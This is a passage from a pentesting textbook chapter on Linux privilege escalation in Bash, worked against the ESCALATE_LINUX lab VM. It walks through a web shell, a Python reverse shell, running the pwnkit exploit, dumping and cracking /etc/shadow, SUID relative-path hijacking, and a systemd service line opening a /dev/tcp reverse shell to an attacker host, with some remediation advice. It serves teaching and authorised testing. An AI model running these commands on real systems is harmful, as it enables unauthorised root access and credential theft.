# Security Chapter Extract
Book: Steve Campbell - Bash Shell Scripting for Pentesters (2024, Packt Publishing Pvt Ltd) - libgen.li
Chapter: 11 - , we will dive in and explore how to enumerate Linux systems in a Bash shell to escalate our privileges for a complete
Security Relevance Score: 20
Word Count: 5637
Extracted: 2025-06-13 23:41:12

---

, we will dive in and explore how to enumerate Linux systems in a Bash shell to escalate our privileges for a complete
    


      system takeover.
     















     11
    





     Privilege Escalation in the Bash Shell
    




      Privilege escalation
     


     is a
    



     critical aspect of pentesting in Unix and Linux environments.
    

     This chapter explores the techniques and methodologies for identifying and exploiting vulnerabilities that allow an attacker to elevate their privileges within a system.
    

     We will focus on utilizing the Bash shell, a powerful tool present in most Unix-based systems, to execute various privilege
    


      escalation strategies.
     




     Throughout this chapter, we will examine
    



     common
    


      privilege escalation vectors
     


     , develop Bash scripts for system enumeration, and analyze the exploitation of misconfigurations in services and scheduled tasks.
    

     Special attention will be given to understanding and
    



     leveraging
    


      Set User ID
     


     (
    


      SUID
     


     ) and
    


      Set Group ID
     


     (
    


      SGID
     


     ) binaries, which
    



     often provide opportunities for privilege escalation.
    

     By mastering these techniques, pentesters can effectively assess and improve the security posture of Unix and
    


      Linux systems.
     




     We cover only the most common privilege escalation vectors in this chapter.
    

     For an extensive list and a link to download the LinPEAS tool to automate these checks, visit the HackTricks website’s Linux privilege escalation checklist
    


      at
     




       https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
      




      .
     




     Although the LinPEAS application will help find privilege escalation attack vectors for you, learning to do this manually will increasingly become more valuable as more Linux systems utilize some
    



     form of
    


      Endpoint Detection and Response
     


     (
    


      EDR
     


     ) protection agent.
    

     These EDR agents may detect and block scripts such as LinPEAS, forcing you to run these
    


      checks manually.
     




     In this chapter, we’re going to cover the following
    


      main top
     





      ics:
     





      Understanding privilege escalation in
     


       Unix/Linux systems
      




      Enumeration techniques for
     


       privilege escalation
      




      Exploiting SUID and SGID binaries
     


       with
      





       Bash
      




      Leveraging misconfigured services and
     


       scheduled tasks
      







     Technical requirements
    



     The code for this chapter can be found
    


      at
     




       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11
      




      .
     




     If you want to follow along with the exercises, you should have a Kali virtual machine available, and will need to download and run the
    


      ESCALATE_LINUX
     


     virtual machine from
    


      https://www.vulnhub.com/entry/escalate_linux-1,323/
     


     .
    

     Ensure that both the Kali and
    


      ESCALATE_LINUX
     


     virtual machines have the same virtual
    


      network configuration.
     




     Run the following command to install prerequisite tools
    


      in Kali:
     



$ sudo apt update && sudo apt install -y dirsearch




     Understanding privilege escalation in Unix/Linux systems
    



     Privilege escalation
    



     in Unix/Linux systems refers to the process
    



     of gaining higher-level access rights than those initially granted to a user or application.
    

     This concept is fundamental to system security and is a key focus for both system administrators
    


      and
     



      pentest
     



      ers.
     




     In Unix/Linux environments, the privilege system is primarily based on user and group permissions.
    

     The root user, with a user ID of
    


      0
     


     , has unrestricted access to the entire system.
    

     Regular users have limited permissions, typically confined to their home directories and specific
    


      system resources.
     




     Privilege escalation can be categorized into two
    


      main types:
     






       Vertical privilege escalation
      


      : This involves
     



      elevating privileges from a lower-level user to a higher-level user, often targeting root access.
     

      An example is a standard user gaining
     


       root privileges.
      





       Horizontal privilege escalation
      


      : This occurs when a user gains access to resources or performs actions that should be restricted to a different user of the same privilege level.
     

      An example is one standard user accessing another standard
     


       user’s files.
      





     Common paths for privilege escalation in Unix/Linux systems include
    


      the following:
     





      Exploiting vulnerabilities in system services
     


       or applications
      




      Misconfigurations in file or
     


       directory permissions
      




      Weak password policies or
     


       compromised credentials
      





       Kernel exploits
      




      Unpatched
     


       software vulnerabilities
      





     Before we get into the details of the common paths for privilege escalation, it is essential that we first review the Unix/Linux permission model.
    

     Understanding the
    


      Unix/Linux permission model
     


     is
    



     essential for grasping privilege
    


      escalation concepts:
     





      File permissions are represented by read (
     


       r
      


      ), write (
     


       w
      


      ), and execute (
     


       x
      


      ) flags for the owner, group,
     


       and others
      




      Special permissions such as
     


       SUID
      


      ,
     


       SGID
      


      , and
     


       Sticky Bit
      


      can
     



      also impact
     


       privilege levels
      




      User and group management, including the
     


       /etc/passwd
      


      and
     


       /etc/shadow
      


      files, play a role in
     


       access control
      





     Privilege
    



     escalation
    



     techniques often involve a combination of information gathering, vulnerability identification, and exploitation.
    

     Attackers may chain multiple vulnerabilities or misconfigurations to gradually increase their
    


      access levels.
     




     It’s important to note that privilege escalation is not inherently malicious.
    

     System administrators and security professionals use these techniques to identify and address security weaknesses.
    

     However, in the hands of malicious actors, privilege escalation can lead to unauthorized access, data breaches, and
    


      system compromise.
     




     Preventive measures against unintended privilege escalation include
    


      the following:
     





      Regular system updates and
     


       patch management
      




      Proper configuration of file and
     


       directory permissions
      




      Implementation of the principle of
     


       least privilege
      




      Use of
     


       security-enhanced Linux
      


      (
     


       SELinux
      


      )
     


       or
      




        AppArmor
       





      Regular security audits and
     


       vulnerability assessments
      





     Understanding
    



     privilege
    



     escalation is critical for both defending against and conducting pentests on Unix/Linux systems.
    

     It forms the foundation for more advanced techniques and exploits
    



     that
    



     will be explored in subsequent sections of
    


      this chapter.
     




     The next section will explore how to
    


      perform enumeration.
     






     Enumeration techniques for privilege escalation
    




      Enumeration
     


     is a key
    



     phase in privilege
    



     escalation, allowing pentesters to gather information about the target system.
    

     This section focuses on Bash commands and techniques for effective system enumeration for
    


      privilege escalation.
     






     Initial access
    



     This section will precede
    



     privilege escalation.
    

     It covers connecting to the
    


      ESCALATE_LINUX
     


     virtual machine, which we’ll call the
    


      target
     


     for the remainder of this chapter.
    

     Once we have established a working shell, we’ll move forward into
    


      subsequent sections.
     




     In this exercise, I have both the Kali and the target running in VirtualBox virtual machines.
    

     Both Kali and
    


      ESCALATE_LINUX
     


     offer virtual machine OVA files that can be downloaded and imported
    


      into VirtualBox.
     




     The network interfaces are configured to use the host-only network adapter, as shown in the
    


      following figure:
     











     Figure 11.1 – The virtual network interface configuration
    



     The Kali virtual
    



     machine should have an additional virtual network interface added.
    

     Of the two Kali virtual network interfaces, one should be in
    


      Host-only
     


     mode, and the other should be in
    


      Bridged
     


     mode, as shown in the
    


      following screenshot:
     











     Figure 11.2 – The Kali VirtualBox network interface configuration
    



     This configuration will keep the vulnerable target system isolated from the network while allowing the Kali system to connect to the internet to download any
    


      needed tools.
     




     If you have any trouble identifying which of Kali’s network interfaces are connected to each network mode, the command output shown in the following figure should help you figure
    


      this out:
     











     Figure 11.3 – Enumerating virtual network interfaces
    



     The Kali VirtualBox virtual machine downloaded from Offensive Security (
    


      https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z
     


     ) already has the guest extensions installed, which will allow you to query the network interfaces to find their IP addresses.
    

     In the preceding figure, the first
    


      Network Interface Card
     


     (
    


      NIC
     


     ) is
    



     configured for
    


      Host-only
     


     access, as is the target system.
    

     Unfortunately, the target system doesn’t have VirtualBox guest extensions installed; therefore, we cannot query for its IP address information and will have to rely
    


      on Kali.
     




     Moreover, the
    



     second and third commands in the preceding figure differ only in the number of the virtual interface.
    


      NI
     





      C 1
     


     corresponds to
    


      /VirtualBox/GuestInfo/Net/0/V4/IP
     


     , and
    


      NIC 2
     


     corresponds to
    


      /VirtualBox/GuestInfo/Net/1/V4/IP
     


     .
    

     Since
    


      NIC 1
     


     is configured for
    


      Host-only
     


     and has an IP address of
    


      192.168.56.101
     


     , we can guess that the target system is also found on this network.
    

     Next, let’s scan that network to find an IP address with TCP port
    


      80
     


     (HTTP) listening, as
    


      shown here:
     











     Figure 11.4 – Scanning the network to locate HTTP servers
    



     If we visit that address in our web browser, we find an Apache2 default page,
    


      as shown:
     











     Figure 11.5 – A default Apache2 page
    



     Since we’ve found only a default website, we need to check for additional web content.
    

     Run the following
    



       dirsearch
      




      command:
     



$ dirsearch -u http://192.168.56.102


     The output reveals
    


      shell.php
     


     , as shown in the
    


      following figure:
     











     Figure 11.6 – A valid PHP web page is located
    



     If we visit
    


      https://192.168.56.102/shell.php
     


     in a web browser on Kali, we see the following text on the
    



     web page:
    


      /*pass cmd as
     




       get parameter*/
      




      .
     




     This is a huge hint that we won’t ordinarily get, so keep in mind that we’ve been given a shortcut to finding the vulnerability so that we can spend our precious time focusing on privilege escalation, which is what the target was
    


      intended for.
     




     The following figure shows how to properly exploit this
    


      web page:
     











     Figure 11.7 – An exploit proof-of-concept for the web shell
    



     Next, we need to get a shell on the target system.
    

     In your Kali terminal, enter
    


      nc -nlvp 4444
     


     and press the
    



       Enter
      




      key.
     




     Visit the
    


      Reverse Shell Cheat Sheet
     


     at
    


      https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
     


     .
    

     We’re going to use the Python version.
    

     Copy the code for the Python shell, then visit the CyberChef website at https://gchq.github.io/CyberChef/#recipe=URL_Encode(true) and paste the Python code into the
    


      Input
     


     pane.
    

     Change the Python command to be executed from
    


      /bin/sh
     


     to
    


      /bin/bash
     


     .
    

     Change the IP address and port to match what you’re using on your Kali system.
    

     For the port, you can use
    


      4444
     


     .
    

     Click the
    


      Copy
     


     button in the
    



       Output
      




      pane.
     




     In your web browser where you have the target
    


      shell.php
     


     , paste in the Python code after
    


      cmd=
     


     , as shown in the following figure, then press the
    



       Enter
      




      key:
     











     Figure 11.8 – Executing the Python payload in the web shell
    



     In your Kali
    



     terminal, you should see that you have a reverse shell connection, as
    


      shown here:
     











     Figure 11.9 – A reverse shell from the target system
    



     Now that we have
    



     established our session, let’s move forward and start exploring the target in the
    


      next section.
     






     System information gathering
    



     The first thing I
    



     want to know once I have a shell on a Linux system is whether I can run any commands using
    


      sudo
     


     .
    

     Enter the following command to check your
    



       sudo
      




      permissions:
     



$ sudo -l


     Unfortunately, we’re prompted for a password on the target system.
    

     Since we don’t know the password for this user account, this is a dead-end.
    

     If we did know the password, we could enter it, and if we’re lucky, the command output would show that we could run a command with
    


      sudo
     


     and possibly abuse it to
    


      escalate privileges.
     




     Tip
    



     If you enter the
    


      sudo -l
     


     command and get any output that shows you can run anything using
    


      sudo
     


     , search for the command on the
    


      GTFOBins
     


     website (
    


      https://gtfobins.github.io
     


     ) to see whether you can abuse it for
    


      privilege escalation.
     




     Let’s take a look around in the current directory,
    


      /var/www/html
     


     .
    

     We check to see whether the files in this directory contain any credentials.
    

     However, we are not in luck, as shown in the
    


      following figure:
     











     Figure 11.10 – Examining files in the current working directory
    



     Next, we take a look around in our home directory.
    

     Use the
    


      cat
     


     command to examine any previous commands this user has previously entered using the
    


      following command:
     



$ cat /home/user6/.bash_history


     While looking in our home directory, we do find an interesting bit of information, as
    


      seen here:
     











     Figure 11.11 – A file that indicates this user has sudo rights
    



     The highlighted file indicates that this user has run the
    


      sudo
     


     command in the past.
    

     Without knowing the user’s password, we cannot hope to run
    


      sudo -l
     


     to find out what they can run
    


      using
     




       sudo
      




      .
     




     Can we view any other user’s
    


      .bash_history
     


     file?
    

     Enter the following command to
    






      check this:
     



$ find /home -name .bash_history 2>/dev/null -exec cat {} +


     The preceding command runs the
    


      find
     


     command on the
    


      /home
     


     directory, looking for a filename (
    


      -name
     


     ) of
    


      .bash_history
     


     .
    

     Errors (
    


      file descriptor 2
     


     ) are sent to
    


      /dev/null
     


     , which results in them being discarded.
    

     Any files matching this pattern are printed to the screen (
    


      -exec cat {} +
     


     ).
    

     We get a lot more output than we saw when we looked at the current user’s
    


      .bash_history
     


     file, but don’t find any credentials in command-line arguments in the output.
    

     Still, it’s worth going back and examining the
    


      .bash_history
     


     file in each user’s home directory and making a note of who’s running what command.
    

     This information can often be useful once we have more information.
    

     Since we have some level of access to various users’ home directories, make sure you take the time to explore these directories for any files containing
    


      useful information.
     




     Next, let’s take a look
    



     at the system architecture and look for kernel exploits.
    

     Understanding the system’s architecture, kernel version, and distribution helps identify potential vulnerabilities.
    

     The following command prints
    


      this information:
     



$ uname -a


     The following screenshot shows this command output on the target system.
    

     It reveals that the target system is running Ubuntu Linux, kernel version
    


      4.15.0-45-generic
     


     , and the architecture
    


      is
     




       x86_64
      




      .
     











     Figure 11.12 – The command output shows essential information about the target operating system
    



     To get specific operating system information, try the
    


      following commands:
     



$ cat /etc/lsb-release
$ cat /etc/os-release


     The command output is shown on the
    


      target system:
     











     Figure 11.13 – Enumerating operating system release information
    



     Next, let’s take
    



     the information that we have about the target operating system and kernel version and check for privilege escalation exploits.
    

     In your Kali terminal, enter the
    


      following command:
     



$ searchsploit -s "4.15" --id


     Here is
    


      the explanation:
     






       searchsploit
      


      : Allows you to search through exploits and shellcodes using one or more
     



      terms
     


       from
      




        Exploit-DB
       






       -s
      


      :
     


       Strict search
      





       --id
      


      : Displays the
     


       EDB-ID
      


      value rather than the
     


       local path
      





     The output of
    


      searchsploit
     


     is shown in the
    


      following figure:
     











     Figure 11.14 – A demonstration of using searchsploit
    



     Tip
    



     I recommend that you explore the
    


      searchsploit
     



      man
     


     page.
    

     There are some really useful features, such as the ability to examine (
    


      -x
     


     ) the content, and mirror (
    


      -m
     


     ) the exploit to the
    


      current directory.
     




     Based on the
    



     kernel version and knowledge that the target is running Ubuntu
    


      18.04
     


     , we should look into the
    


      polkit
     


     /
    


      pwnkit
     


     exploits (
    


      CVE-2021-4034
     


     ).
    

     This vulnerability was patched in the
    


      polkit
     


     version
    


      0.120
     


     .
    

     The following figure shows the
    


      searchsploit
     


     command output for
    


      this vulnerability:
     











     Figure 11.15 – The searchsploit results for the polkit exploit
    



     We can enumerate the
    


      polkit
     


     version using the
    


      following command:
     



$ pkexec --version


     The output shown in the following figure reveals that the target
    


      polkit
     


     version
    


      is vulnerable:
     











     Figure 11.16 – The pkexec --version command reveals that the target is vulnerable
    



     Before we attempt to exploit this, we check to ensure that the GCC compiler is installed using the
    


      which gcc
     


     command.
    

     We find that it
    


      is installed.
     




     We run the
    


      searchsploit -m 50689
     


     command, which copies the exploit code to our current directory.
    

     Examining the text of this file, we find that it contains code for two files,
    


      evil-so.c
     



      and
     




       exploit.c
      




      .
     




     Important note
    



     Never blindly run exploit code and third-party scripts unless you first review the source code to verify that there’s nothing malicious in it that will exploit your or your customer’s system in
    


      unintended ways!
     




     Since the source
    



     of this exploit code comes from
    


      Exploit-DB
     


     (
    


      searchsploit
     


     ), it’s safe to use because
    


      Offensive Security
     


     reviews
    



     exploit submissions before they
    


      are posted.
     




     We can transfer exploits and scripts over to the target system.
    

     On the Kali system, make a new directory (
    


      mkdir
     


     ) named
    


      share
     


     .
    

     We never want to share our home directory or any location where we may have sensitive information to the network.
    

     Change directory to
    


      share
     


     (
    


      cd share
     


     ), copy any exploits or scripts to this directory, then start a Python HTTP server as follows:
    


      python3 -
     




       m http.server
      




      .
     




     On the target system, change directory to
    


      /tmp
     


     (
    


      cd /tmp
     


     ).
    

     This directory is writable by all users.
    

     The
    


      /dev/shm
     


     directory is also usually writable by all users.
    

     Then, transfer the file from Kali using the
    


      wget http://192.168.56.11:8000/filename
     


     command.
    

     Of course, be sure to change the IP address and filename to values appropriate for your system.
    

     Don’t forget to make your exploits or scripts executable (
    


      chmod +x
     


     ) before you
    


      run them!
     




     On the target system, compile the exploits, as shown in the
    


      following figure:
     











     Figure 11.17 – Compiling the polkit exploit code
    



     The output in the preceding figure is only warnings, and we check the files using the
    


      ls -l
     


     command and see that they are, in fact, compiled.
    

     We change the permissions to make them
    



     executable by running the
    


      chmod +x filename
     


     command, and then run the exploit.
    

     The following figure shows the exploit
    


      in action:
     











     Figure 11.18 – Running the polkit exploit results in a root shell
    



     While we have elevated privileges as
    


      root
     


     , we need to establish some form of persistence.
    

     I
    


      cat
     


     the
    


      /etc/shadow
     


     file, which contains password hashes, and then save a copy to my Kali system.
    

     I then attempt to crack the hashes using the
    


      john shadow
     


     command.
    

     I managed to crack the
    


      root
     


     password, as shown in the following figure, where we find that the
    


      root
     


     password is
    


      12345
     


     .
    

     Having the
    


      root
     


     password will allow us to continue accessing this system as
    


      root
     


     should we
    


      get disconnected:
     











     Figure 11.19 – Using john to crack the root password
    



     For the sake of learning, let’s continue as if we haven’t found this exploit and continue to enumerate the system for privilege
    


      escalation paths.
     




     Next, we need to test for writable directories in the path of
    


      user6
     


     .
    

     If any writable directories are found
    



     in our path, we may be able to hijack and replace their content.
    

     For this, we’ll use the following script, which can be found in this chapter’s GitHub repository
    


      as
     




       ch11_checkpath.sh
      




      :
     



#!/usr/bin/env bash
# Get the PATH environment variable
path_dirs=$(echo $PATH | tr ':' '\n')


     The preceding code starts with the familiar shebang line.
    

     The
    


      PATH
     


     environment variable is expanded, then each colon is replaced with a newline to make the data into one directory per line.
    

     This data is then assigned to the
    



       path_dirs
      




      variable.
     



# Function to check write permissions recursively
check_permissions() {
  local dir=$1
  echo "[i] Checking write permissions for $dir and its subdirectories:"
  find "$dir" -type d | while read subdir; do
    if [ -w "$subdir" ]; then
      echo "[!] $subdir is writable!"
    else
      echo "[-] $subdir is not writable"
    fi
  done
}


     The preceding
    



     code block checks each directory (recursively) if it
    


      is writable.
     



# Loop through each directory in PATH and check write permissions recursively
for dir in $path_dirs; do
  if [ -d "$dir" ]; then
    check_permissions "$dir"
  fi
done


     The preceding code block loops through the list of directories in the
    


      path_dir
     


     variable and passes each one to the
    



       check_permissions
      




      function.
     




     We run this script on the target, but no writable directories are discovered, as shown in the
    


      following figure:
     











     Figure 11.20 – Checking for writable directories in PATH
    



     Next, we check environment variables for credentials, keys, or any interesting data using the
    


      following
     







      command:
     



$ env


     The output is
    


      as follows:
     











     Figure 11.21 – Environment variables are displayed
    



     Unfortunately, we do not find any interesting data in the
    


      environment variables.
     




     Next, we’ll explore running processes.
    

     The
    


      pspy
     


     tool will allow us to monitor running processes without being the
    


      root
     



      user:
     




       https://github.com/DominicBreuker/pspy
      




      .
     




     After transferring
    


      pspy64
     


     to the target system, we run it and see something interesting in the output, as shown in the
    


      following figure:
     











     Figure 11.22 – Interesting executables running in the pspy64 output
    



     We examine
    



     these files in
    


      /home/user4
     


     and find that we do not have the ability to write to them, as seen in the
    


      following figure:
     











     Figure 11.23 – Examining files in user4’s home directory
    



     Finally, let’s check some common file permissions.
    

     Run the following commands on the
    


      target system:
     



$ ls -l /etc/passwd
$ ls -l /etc/shadow


     Of course, we don’t have any luck here and we can’t write to these files and can’t read password hashes from
    


      /etc/shadow
     


     , but it never hurts
    


      to check.
     




     This section gave a primer on common filesystem paths to check, and how to enumerate the kernel and
    



     operating system versions and search for working exploits.
    

     In the next section, we’ll explore SUID and SGID binaries and how they can be useful for
    


      privile
     





      ge escalation.
     






     Exploiting SUID and SGID binaries with Bash
    



     SUID and SGID are
    



     special permissions in Unix-like systems that
    



     allow users to execute files
    



     with the permission of the file owner or group.
    

     When misused, these permissions can lead to privilege escalation.
    

     This section focuses on identifying and exploiting SUID/SGID binaries using Bash commands
    


      and scripts.
     




     In a previous chapter, you learned about Linux file permissions.
    

     Let’s have a quick recap and then build on that concept to understand SUID
    


      and SGID.
     




     If we enter the
    


      ls -l
     


     command and view the output for the
    


      shell.php
     


     file, we fi
    









     nd
    


      the following:
     



-rw-r--r-- 1 root root    68 Jun  4  2019 shell.php


     Let’s break that down.
    

     The first character is always either
    


      -
     


     for a file or
    


      d
     


     for a directory.
    

     In the following figure, I have highlighted the file type.
    

     Since the file type in this figure is a dash (
    


      -
     


     ), we know this is
    


      a file:
     











     Figure 11.24 – The file type is highlighted and shows it is a file, not a directory
    



     In the following figure, the user permissions are highlighted.
    

     If you recall, when all three are set (read, write, and execute), they sum to
    


      7
     


     (
    


      4 + 2 + 1 = 7
     


     ).
    

     In this case, since the file is not executable, the user permissions sum to
    


      6
     


     (
    


      4 + 2 + 0 =
     




       6
      




      ):
     











     Figure 11.25 – User permissions are highlighted
    



     Group permissions are examined in the following figure.
    

     The file is readable but not writeable or executable.
    

     The group permissions sum to
    


      4
     


     (
    


      4 + 0 + 0 =
     




       4
      




      ):
     











     Figure 11.26 – Group permissions are highlighted
    



     Other permissions are examined in the following figure.
    

     If you are not the user or a member of the
    



     group
    



     listed
    



     on the file permissions, then the
    


      other
     



      permissions apply:
     











     Figure 11.27 – Other permissions are highlighted
    



     In the following figure, the
    


      root
     


     user is the
    


      file owner:
     











     Figure 11.28 – File user ownership is shown to be root
    



     The
    


      root
     


     group has group permissions on this file, as shown in the
    


      following figure:
     











     Figure 11.29 – Group ownership belongs to the root group
    



     Linux special
    



     file
    



     permissions
    



     extend beyond the basic read, write, and execute permissions.
    

     Two key special permissions are the SUID and
    


      SGID bits:
     






       SUID
      


      : When applied to an executable file, SUID allows the file to run with the privileges of the file’s owner, rather than the user executing it.
     

      It’s represented by
     


       s
      


      in the owner’s execute
     


       permission field.
      



       To set SUID, enter this command:
      


        ch
       









        mod
       




         u+s filename
        




        .
       




       To set SUID using numeric representation, enter this command:
      


        chmod
       




         4000 filename
        




        .
       




       When examining file permissions, the following figure demonstrates the permissions of a file
      


        with SUID:
       













     Figure 11.30 – File permissions reveal it is SUID
    





       SGID
      


      : SGID works similarly to SUID but for groups.
     

      When set on an executable, it runs with the privileges of the file’s group.
     

      On directories, it causes new files created within to inherit the group of the
     


       parent directory.
      



       To set SGID, enter this command:
      


        chmod
       




         g+s filename
        




        .
       




       To set SGID using numeric representation, enter this command:
      


        chmod
       




         2000 filename
        




        .
       




       When examining file permissions, the following figure demonstrates the permissions of a file
      


        with SGID:
       













     Figure 11.31 – File permissions reveal it is SGID
    



     These permissions are relevant to privilege escalation in several ways.
    

     If a vulnerable SUID binary owned by
    


      root
     


     can be exploited, it may lead to privilege escalation.
    

     SGID is similar to SUID, except
    



     escalating to
    



     the privileges of a specific
    



     group.
    

     If an attacker can modify these binaries, they can insert malicious code to be executed with elevated privileges.
    

     Unnecessary SUID or SGID bits on executables increase the
    


      attack surface.
     




     To find SUID and SGID binaries, use the following
    


      Bash commands:
     



# Find SUID binaries
$ find / -perm -u=s -type f 2>/dev/null
# Find SGID binaries
$ find / -perm -g=s -type f 2>/dev/null


     These commands search the entire filesystem starting at the top level
    


      /
     


     for files (
    


      -type f
     


     ) with SUID (
    


      -u=s
     


     ) or SGID (
    


      -g=s
     


     ) bits set.
    

     The
    


      2>/dev/null
     


     expression redirects error messages to
    


      /dev/null
     


     , suppressing permission-denied errors.
    

     The
    


      /dev/null
     


     file is essentially a trashcan with a black hole at the bottom.
    

     Anything that is sent to this special place
    


      is discarded.
     




     Let’s run these commands on the target system and compare the output.
    

     The following figure shows the partial output of the command that searches for
    


      SUID files:
     











     Figure 11.32 – Partial output of a list of SUID files
    



     In the output on
    



     the
    



     target
    



     system, there are two interesting matches found in the user’s home directories.
    

     This is shown in the
    


      following figure:
     











     Figure 11.33 – Specific SUID files from our search are examined
    



     Taking a look at the
    


      /home/user3/shell
     


     file, we run the
    


      file
     


     command and find that it’s a compiled executable, as shown in the
    


      following figure:
     











     Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable
    



     There are Linux debugging programs that will trace the execution and print system and library calls.
    

     However, we don’t need to make this any more complicated than it is.
    

     If we run the
    


      strings
     


     command (
    


      strings /home/user3/shell
     


     ), we find a reference to a file,
    


      ./.script.sh
     


     , as shown in the
    


      next figure:
     











     Figure 11.35 – The output of the strings command shows that it calls a shell script file
    



     I check the contents of this file and it’s simply a taunt and doesn’t contain anything useful.
    

     However, I see in the
    


      strings
     


     output that
    


      .script.sh
     


     is called using its relative path,
    


      ./.script.sh
     


     .
    

     This means that instead of calling the absolute path of
    


      /home/user3/.script.sh
     


     , it’s
    



     called
    



     relative
    



     to the current working directory.
    

     We can
    


      cd
     


     to the
    


      /tmp
     


     directory, create a malicious version of
    


      .script.sh
     


     , and execute
    


      /home/user3/shell
     


     , which will call the local copy of
    


      .script.sh
     


     , since we don’t have permission to write to the
    


      original copy.
     




     The following figure demonstrates this process of exploiting the
    


      /home/user3/shell
     


     SUID file to get a
    


      root shell:
     











     Figure 11.36 – Exploiting an SUID file to gain root privileges
    



     Now that you’ve seen how dangerous SUID and SGID executables can be, let’s talk about how to secure them
    



     to
    



     prevent
    



     exploitation.
    

     If we examine the file permissions, we see that
    


      others
     


     can read and execute, as shown in the
    


      following figure:
     











     Figure 11.37 – Examining the file permissions of the SUID shell
    



     It currently has the numeric file permissions of
    


      4755
     


     .
    

     To keep the SUID set and secure the file from those who are not the
    


      root
     


     user or in the
    


      root
     


     group, we can remediate this using the
    


      following command:
     



$ chmod 4754 /home/user3/shell


     After entering this command, you can see in the following figure that anyone other than
    


      root
     


     or a member of the
    


      root
     


     group can no longer execute
    


      this file:
     











     Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID file
    



     This concludes the topic
    



     of
    



     exploiting
    



     and securing SUID and SGID executables.
    

     In the next section, you’ll learn about enumerating and exploiting misconfigured services and scheduled tasks
    


      in Bash.
     






     Leveraging misconfigured services and scheduled tasks
    



     In cybersecurity, understanding
    



     how to enumerate, exploit, and
    



     secure misconfigured services and cron jobs on Linux systems is essential.
    

     This section will guide you through the process using Bash scripting, providing practical examples
    


      and explanations.
     





      Systemd
     


     is a
    



     system and service manager for Linux operating systems.
    

     It is responsible for initializing the system, managing system processes, and handling system services.
    

     Systemd services are essential components that define how various applications and processes should be started, stopped,
    


      and managed.
     




     Systemd services are defined by unit files, which are configuration files that describe how to manage a service or process.
    

     These unit files typically have a
    


      .service
     


     extension and are located in directories such as
    


      /etc/systemd/system/
     


     or
    


      /lib/systemd/system/
     


     .
    

     Each service unit file contains several sections that specify the behavior of
    


      the service.
     




     To begin, we need to list all active services on the system.
    

     This can be achieved using the
    


      systemctl
     


     command, as
    


      shown next:
     



$ systemctl list-units --type=service --state=active


     This command lists all active services on
    


      the system.
     




     Next, we need to check the permissions of these services to identify
    


      any misconfigurations.
     




     Writable service files can be exploited by modifying them to execute malicious code.
    

     The following command searches for writable files
    





     i
    





     n the
    



       systemd
      




      directory:
     



$ find /etc/systemd/system/ -type f -writable


     The output of this command doesn’t return any results on the target system.
    

     However, let’s continue and learn how to modify writable service files if you find one during your pentests.
    

     If a writable service file is found, it can be modified to execute a
    


      reverse shell.
     




     Here is an example of modifying a writable service file (replace
    


      attacker_ip
     


     with the appropriate val
    





     ue from your
    


      Kali system):
     



$ echo "[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" > /etc/systemd/system/vulnerable.service


     On your Kali system, execute
    



     the following command to be ready to
    



     receive the
    


      reverse shell:
     



$ nc -nlvp 4444


     Then, reload the systemd manager configuration,
    


      as shown:
     



$ systemctl daemon-reload


     Restart the vulnerable service,
    


      as shown:
     



$ systemctl restart vulnerable.service


     This should result in receiving a reverse shell from
    


      the target.
     




     Now that you’ve learned how to enumerate and exploit vulnerable services, let’s move ahead and
    



     examine
    



       cron jobs
      




      .
     




     Cron jobs are scheduled tasks that run automatically at specified intervals on Unix-like operating systems.
    

     They are managed by
    



     the
    


      cron daemon
     


     , a background process that executes commands at predetermined times and dates.
    

     In cybersecurity, cron jobs can be invaluable for automating routine tasks, monitoring systems, and maintaining security protocols.
    

     Cron jobs can be exploited
    


      if misconfigured.
     




     The following Bash command is used to examine scheduled tasks on a Linux system, specifically, to identify potential privilege escalation opportunities related to cr
    





     on jobs and
    


      scheduled tasks:
     



$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"


     By running this command, you are looking for all scheduled tasks (
    


      cron
     


     jobs,
    


      at
     


     jobs, and
    


      anacron
     


     jobs) that are configured on the system, excluding any
    


      commented lines.
     




     The output of this command on the target system can be seen in the
    


      following figure:
     











     Figure 11.39 – The output of the command that examines scheduled tasks
    



     You can see in the
    



     figure
    



     that
    


      autoscript.sh
     


     is running
    


      as
     




       root
      




      .
     




     The
    


      autoscript.sh
     


     entry was also discovered earlier in the chapter, as seen in the
    


      pspy64
     


     command output,
    


      shown here:
     











     Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry running as root
    



     We examine the
    


      autoscript.sh
     


     file content to find what it’s executing, as shown in the
    


      following figure:
     











     Figure 11.41 – Examining the content of autoscript.sh to understand its purpose
    



     We see that it seems to be incomplete, according to the remark.
    

     However, it does execute an interactive shell with the
    


      bash -
     




       i
      




      command.
     




     When examining the file permissions, we find that
    


      user6
     


     doesn’t have permission to write to the file, and it’s
    


      not SUID:
     











     Figure 11.42 – Examining the autoscript.sh file permissions
    



     From this perspective, we’ll need to have a shell as
    


      user4
     


     or obtain the password for the account to exploit this privilege escalation vector.
    

     We have neither in
    


      this scenario.
     




     Securing vulnerable services and cron jobs is approached in the same way that we previously secured SUID and SGID executables, by examining file permissions and ensuring that unauthorized users do not have access to edit or
    


      run them.
     




     By following these steps, you can enumerate and exploit misconfigured services and cron jobs on Linux
    



     systems
    



     using Bash scripting.
    

     Understanding these vulnerabilities helps in securing systems against
    


      potential attacks.
     






     Summary
    



     This chapter was dedicated to exploring the techniques and strategies for achieving privilege escalation through the Bash shell in pentesting scenarios.
    

     It focused on identifying and exploiting system vulnerabilities and misconfigurations that could lead to elevated privileges in a Linux
    


      Bash environment.
     




     Linux systems are frequently used to serve web applications.
    

     Knowledge of how to escalate privileges would be valuable to a pentester who has exploited a web application and gained a
    


      low-privilege shell.
     




     The next chapter will examine post-exploitation persistence and pivoting in a Linux
    


      Bash environment.
     















     12
    





     Persistence and Pivoting
    



     This chapter focuses on the techniques
    



     of
    


      persistence
     


     and
    


      pivoting
     


     in
    



     pentesting, specifically using the Bash shell.
    

     We’ll cover methods for maintaining long-term access to compromised systems and expanding access within a network.
    

     Then, we’ll cover both basic and advanced persistence techniques, network pivoting strategies, and methods
    



     for
    


      lateral movement
     


     .
    

     We’ll also address the importance of proper cleanup procedures to minimize detectable traces of
    


      pentesting activities.
     




